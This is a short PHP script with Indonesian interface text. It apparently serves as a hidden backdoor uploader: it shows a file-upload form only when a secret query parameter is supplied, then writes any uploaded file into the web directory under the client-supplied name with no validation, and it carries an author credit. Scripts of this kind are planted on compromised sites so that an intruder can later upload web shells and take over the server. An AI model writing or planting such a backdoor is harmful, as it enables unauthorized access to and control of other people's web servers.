<?php 
if(isset($_GET['anjing']))
{ 
if(isset($_POST['cekfile']))
{
move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
echo "Upload berhasil";
}
else
{
echo '<form enctype="multipart/form-data" action="" method="post">
Oleh : Mas Lian heylian.my.id<br />Nama file : <input type="file" name="file" />
<br /><input name="cekfile" type="submit" value="Upload"></form>';
 } 
 }
?>